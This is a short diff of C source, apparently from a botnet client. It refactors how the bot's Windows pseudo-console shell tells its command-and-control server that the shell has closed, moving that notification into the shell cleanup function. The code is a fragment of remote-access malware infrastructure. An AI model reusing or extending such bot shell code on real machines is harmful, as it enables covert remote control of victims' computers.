@@ -146,6 +146,9 @@ void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
     /* close pseudo console */
     ClosePseudoConsole(shell->pseudoCon);
 
+    /* tell cnc shell is closed */
+    laikaS_emptyOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
+
     /* free shell struct */
     laikaM_free(shell);
     bot->shell = NULL;
@@ -171,11 +174,6 @@ bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
         if (GetLastError() == ERROR_NO_DATA && WaitForSingleObject(shell->procInfo.hProcess, 0) == WAIT_TIMEOUT)
             return true; /* recoverable, process is still alive */
         /* unrecoverable error */
-
-        /* tell cnc shell is closed */
-        laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
-
-        /* kill shell */
         laikaB_freeShell(bot, shell);
         return false;
     }
@@ -193,11 +191,6 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
     while (nLeft > 0) {
         if (!WriteFile(shell->out, (void*)buf, length, &nWritten, NULL)) {
             /* unrecoverable error */
-
-            /* tell cnc shell is closed */
-            laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
-
-            /* kill shell */
             laikaB_freeShell(bot, shell);
             return false;
         }
